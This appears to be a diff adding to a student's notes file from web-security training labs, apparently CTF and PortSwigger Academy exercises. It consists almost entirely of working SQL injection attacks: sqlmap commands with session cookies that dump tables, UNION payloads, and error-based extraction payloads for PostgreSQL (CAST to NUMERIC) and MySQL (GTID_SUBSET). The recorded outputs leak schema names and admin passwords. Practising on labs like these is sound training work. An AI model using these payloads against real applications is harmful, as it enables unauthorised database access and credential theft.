@@ -133,3 +133,63 @@ sqlmap -u "http://192.168.56.104:82/vulnerabilities/sqli/?id=1234&Submit=Submit#
 sqlmap -u "https://0a9f00f004727b0cc07c7a6700ec0095.web-security-academy.net/filter?category=Lifestyle" --cookie "session=v10ds1ie3fB3QwUwmfGdNHtzvNX9dkLp" --tables
 sqlmap -u "https://0a9f00f004727b0cc07c7a6700ec0095.web-security-academy.net/filter?category=Lifestyle" --cookie "session=v10ds1ie3fB3QwUwmfGdNHtzvNX9dkLp" --tables
 sqlmap -u "https://0a9f00f004727b0cc07c7a6700ec0095.web-security-academy.net/filter?category=Lifestyle" --cookie "session=v10ds1ie3fB3QwUwmfGdNHtzvNX9dkLp" --dump -T products
+
+
+########################################
+17.6.1
+http://51.250.73.193:5008/
+ Error message: ERROR: ORDER BY position 2 is not in select list LINE 1: ... password FROM accounts WHERE username = 'qqq' ORDER BY 2--' ^
+
+SELECT password FROM accounts WHERE username = 'a' ORDER BY 1--' 
+
+' UNION SELECT username FROM accounts--
+' UNION SELECT username || '~' || password FROM accounts--
+
+' AND 'admin'=(SELECT username FROM accounts)--
+
+
+111111' AND 2287=CAST((CHR(113))||(SELECT (CASE WHEN (2287=2287) THEN 1 ELSE 0 END))::text||(CHR(113)) AS NUMERIC)--
+111111' AND 2287=CAST((CHR(113))||(SELECT 'AAA')::text||(CHR(113)) AS NUMERIC)--
+
+111111' AND 2287=CAST((CHR(113))||(SELECT  table_schema  from information_schema.tables WHERE table_schema like '%pu%' limit 1)::text||(CHR(113)) AS NUMERIC)--
+Error message: ERROR: invalid input syntax for type numeric: "qpublicq"
+
+111111' AND 2287=CAST((CHR(113))||(SELECT TABLE_NAME from information_schema.tables WHERE table_schema = 'public' limit 1)::text||(CHR(113)) AS NUMERIC)--
+accounts
+
+111111' AND 2287=CAST((CHR(13))||(SELECT COLUMN_NAME from information_schema.columns WHERE table_schema = 'public' limit 1 offset 1)::text||(CHR(13)) AS NUMERIC)--
+user_id
+username
+password 
+
+111111' AND 2287=CAST((CHR(13))||(SELECT user_id ||'-'|| username|| '-' || password from public.accounts)::text||(CHR(13)) AS NUMERIC)--
+Error message: ERROR: invalid input syntax for type numeric: 
+" 1-admin-WhiteHat777 "
+
+
+#################################
+17.6.2 
+http://51.250.73.193:5009/
+' or 1=1--
+
+' AND GTID_SUBSET(CONCAT(0x31,(SELECT TABLE_NAME from information_schema.tables limit 1),0x31),6527)-- MQgU
+
+' AND GTID_SUBSET(CONCAT(0x31,(SELECT  table_schema  from information_schema.tables WHERE table_schema like '%ct%' limit 1),0x31),6527)-- MQgU
+Malformed GTID set specification '1ctf1'. 
+
+' AND GTID_SUBSET(CONCAT(0x31,(SELECT TABLE_NAME from information_schema.tables WHERE table_schema = 'ctf' limit 1),0x31),6527)-- MQgU
+Malformed GTID set specification '1users1'. 
+
+' AND GTID_SUBSET(CONCAT(0x31,(SELECT COLUMN_NAME from information_schema.columns WHERE table_schema = 'ctf' limit 1),0x31),6527)-- MQgU
+id
+login
+password
+
+' AND GTID_SUBSET(CONCAT(0x31,(SELECT Count(*) from ctf.users ),0x31),6527)# MQgU
+1
+
+' AND GTID_SUBSET(CONCAT(0x31,(SELECT id+login+password from ctf.users ),0x31),6527)# MQgU
+' AND GTID_SUBSET(CONCAT(0x10,(SELECT CONCAT(id, '-', login, '-', password) from ctf.users ),0x10),6527)# MQgU
+1
+admin
+sicritadminpass
